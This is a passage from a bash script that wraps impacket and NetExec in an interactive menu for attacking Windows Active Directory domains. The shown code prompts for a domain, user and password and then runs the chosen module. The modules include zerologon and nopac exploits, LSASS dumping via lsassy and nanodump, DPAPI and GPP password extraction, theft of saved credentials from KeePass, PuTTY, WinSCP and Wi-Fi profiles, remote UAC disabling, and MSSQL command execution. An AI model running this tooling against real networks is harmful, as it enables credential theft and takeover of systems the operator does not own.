                  echo ""
 	          echo -e "\e[1;32m[*] Export KRB5CCNAME=$User.ccache ... \e[0m"
                  echo "" 
 		  export KRB5CCNAME=$User.ccache
                  echo -e "\033[36m[+]-- Running smbclient.py -k -no-pass -target-ip $DC $Domain/$User@$DC --[+]\033[0m"
	          echo ""
                  smbclient.py -k -no-pass -target-ip $DC $Domain/$User@$DC
                  echo "" 
               elif [[ "$number" == "exit" ]]; then
                    exit 0
               else
                   echo ""
                   echo -e "\033[35m[!] Enter a Valid Option\033[0m"
               fi
       done
    elif [[ "$tool" == "5" ]]; then
       while true; do 
         history -a "$HISTFILE"
         echo  -e "\033[35m
                   _    __  ______  
                  | \ | \ \/ / ___| 
                  |  \| |\  / |     
                  | |\  |/  \ |___  
                  |_| \_/_/\_\____| 
         \033[0m"
	       echo " 
        	  1) nxc smb domain -u 'user' -p 'password' --continue-on-success
          	  2) nxc smb domain -u 'user' -p 'password' --users
                  3) nxc smb domain -u 'user' -p 'password' --rid-brute
                  4) nxc smb domain -u 'user' -p 'password' --shares
                  5) nxc smb domain -u 'user' -p 'password' -M spider_plus
                  6) nxc smb domain -u 'user' -p 'password' --loggedon-users
                  7) nxc smb domain -u 'user' -p 'password' -M enum_av
                  8) nxc winrm domain -u 'user' -p 'password'
          	  9) nxc ldap domain -u 'user' -p 'password' --bloodhound --collection all --dns-server ip
                  10) nxc smb domain --generate-krb5-file domain-krb5.conf
                  11) nxc smb domain -u 'user' -p 'password' -M timeroast
                  12) nxc smb domain -u "user" -p 'password' --pass-pol
                  13) nxc ldap domain -u 'user' -p 'password' --groups
                  14) nxc ldap domain -u 'user' -p 'password' --computers
                  15) nxc ldap domain -u 'user' -p 'password' --get-sid
                  16) nxc ldap domain -u 'user' -p 'password' -M enum_trusts
                  17) nxc ldap domain -u 'user' -p 'password' -M maq
                  18) nxc smb domain -u 'user' -p 'password' -M zerologon
                  19) nxc smb domain -u 'user' -p 'password' -M coerce_plus
                  20) nxc smb domain -u 'user' -p 'password' -M nopac
                  21) nxc smb domain -u 'user' -p 'password' -M gpp_password 
                  22) nxc smb domain -u 'user' -p 'password' -M lsassy
                  23) nxc ldap domain -u 'user' -p 'password' -M subnets
		  24) nxc ldap domain -u 'user' -p 'password' -M pre2k
		  25) nxc ldap domain -u 'user' -p 'password' -M laps
	  	  26) nxc ldap domain -u 'user' -p 'password' -M pso
		  27) nxc ldap domain -u 'user' -p 'password' -M adcs
                  28) nxc smb domain -u 'user' -p 'password' -M enum_ca
                  29) nxc smb domain -u 'user' -p 'password' -M bitlocker
                  30) nxc smb domain -u 'user' -p 'password' -M dpapi_hash
                  31) nxc smb domain -u 'user' -p 'password' -M nanodump
                  32) nxc smb domain -u 'user' -p 'password' -M remote-uac -o ACTION=disable
                  33) nxc smb domain -u 'user' -p 'password' -M ioxidresolver
                  34) nxc smb domain -u 'user' -p 'password' -M backup_operator
                  35) nxc smb domain -u 'user' -p 'password' -M keepass_discover
                  36) nxc smb domain -u 'user' -p 'password' -M powershell_history
                  37) nxc smb domain -u 'user' -p 'password' -M recent_files
                  38) nxc smb domain -u 'user' -p 'password' -M winscp
                  39) nxc smb domain -u 'user' -p 'password' -M teams_localdb
                  40) nxc smb domain -u 'user' -p 'password' -M mremoteng
                  41) nxc smb domain -u 'user' -p 'password' -M mobaxterm
                  42) nxc smb domain -u 'user' -p 'password' -M putty
                  43) nxc smb domain -u 'user' -p 'password' -M rdcman
                  44) nxc smb domain -u 'user' -p 'password' -M wifi
                  45) nxc smb domain -u 'user' -p 'password' --dpapi 
                  46) nxc ldap domain -u 'user' -p 'password' --gmsa
                  47) nxc ldap domain -u 'user' -p 'password' --trusted-for-delegation 
                  48) nxc ldap domain -u 'user' -p 'password' -M ldap-checker
                  49) nxc mssql domain --local-auth -u 'user' -p 'password' -x 'command' 
               " 
       	       read_input number $'\033[35m# \033[0m'
               if [[ "$number" == ".." ]]; then
                  history -a "$HISTFILE"                
                  exec "$0" "$@"  
               elif [[ "$number" == "1" ]]; then
           	  read_input Domain $'\033[35mEnter The Domain : \033[0m'
          	  read_input User $'\033[35mEnter The User : \033[0m' 
          	  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi            	       
		  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password --continue-on-success $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password --continue-on-success $flag
                  echo ""
               elif [[ "$number" == "2" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m' 
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password --users $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password --users $flag
                  echo ""
               elif [[ "$number" == "3" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi 
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password --rid-brute $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password --rid-brute $flag
                  echo ""  
       	       elif [[ "$number" == "4" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi 
          	  echo ""
          	  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password --shares $flag --[+]\033[0m"
                  echo ""
          	  nxc smb $Domain -u $User -p $Password --shares $flag
          	  echo ""
               elif [[ "$number" == "5" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M spider_plus $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M spider_plus $flag
                  echo ""
               elif [[ "$number" == "6" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m' 
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password --loggedon-users $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password --loggedon-users $flag 
                  echo ""
               elif [[ "$number" == "7" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m' 
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M enum_av $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password -M enum_av $flag
                  echo ""
               elif [[ "$number" == "8" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m' 
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc winrm $Domain -u $User -p $Password $flag --[+]\033[0m"
                  echo ""
                  nxc winrm $Domain -u $User -p $Password $flag
                  echo ""
               elif [[ "$number" == "9" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m' 
                  read_input Ip $'\033[35mEnter The Dns-server Ip : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi 
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc ldap $Domain -u $User -p $Password --bloodhound --collection all --dns-server $Ip $flag --[+]\033[0m"
                  echo ""
                  nxc ldap $Domain -u $User -p $Password --bloodhound --collection all --dns-server $Ip $flag
                  echo ""
             elif [[ "$number" == "10" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                  read_input File $'\033[35mEnter The Output File : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m' 
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain --generate-krb5-file $File $flag --[+]\033[0m"
                  echo ""
 		  nxc smb $Domain --generate-krb5-file $File $flag
                  echo ""
             elif [[ "$number" == "11" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m' 
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m' 
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo "" 
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password -M timeroast $flag --[+]\033[0m"
                  echo ""
 	          nxc smb $Domain -u $User -p $Password -M timeroast $flag
                  echo ""
               elif [[ "$number" == "12" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password --pass-pol $flag --[+]\033[0m"
                  echo ""
                  nxc smb $Domain -u $User -p $Password --pass-pol $flag
                  echo ""
               elif [[ "$number" == "13" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc ldap $Domain -u $User -p $Password --groups $flag --[+]\033[0m"
                  echo ""
                  nxc ldap $Domain -u $User -p $Password --groups $flag
                  echo ""
               elif [[ "$number" == "14" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc ldap $Domain -u $User -p $Password --computers $flag --[+]\033[0m"
                  echo ""
                  nxc ldap $Domain -u $User -p $Password --computers $flag
                  echo ""
               elif [[ "$number" == "15" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  fi
                  echo ""
                  echo -e "\033[36m[+]-- Running nxc ldap $Domain -u $User -p $Password --get-sid $flag --[+]\033[0m"
                  echo ""
                  nxc ldap $Domain -u $User -p $Password --get-sid $flag
                  echo ""
               elif [[ "$number" == "16" ]]; then
                  read_input Domain $'\033[35mEnter The Domain : \033[0m'
                  read_input User $'\033[35mEnter The User : \033[0m' 
                  read_input Password $'\033[35mEnter The Password : \033[0m'
                  read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
                  Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
                  if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
                  else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
